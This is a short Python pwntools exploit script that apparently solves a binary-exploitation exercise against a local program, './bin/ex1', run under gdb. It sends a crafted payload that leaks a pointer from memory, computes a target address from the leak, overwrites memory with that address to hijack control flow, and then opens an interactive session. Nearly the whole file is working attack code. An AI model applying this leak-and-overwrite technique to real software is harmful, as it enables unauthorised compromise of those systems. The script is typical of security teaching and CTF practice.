from pwn import *

context.arch = "amd64"


def extract_address(s):
    leaked_bytes = s
    print(s)
    return struct.unpack("<Q", leaked_bytes[:-1].ljust(8, b"\x00"))[0]


# target = process("./bin/ex1")

context.terminal = ["gnome-terminal", "--geometry=160x80", "-e"]
io = gdb.debug(
    "./bin/ex1",
    """
    break ex1.c:63
    c
    """,
)

print("--", io.recvline())
print("--", io.recvline())
print("--", io.recvline())
print("--", io.recvline())


print("--", io.recv())

payload = b"PRINT\0" + 18 * b"A" + b"\xd0"
io.send(payload)
print("sent next")

db_head_leak_line = io.recv()
db_head = extract_address(db_head_leak_line)
leet_address = db_head + 1120 + 4

print(hex(db_head))
print(hex(db_head + 1120 + 4))

payload = b"\0" + 47 * b"A" + p64(leet_address)
io.send(payload)
print("sent next")
io.interactive()
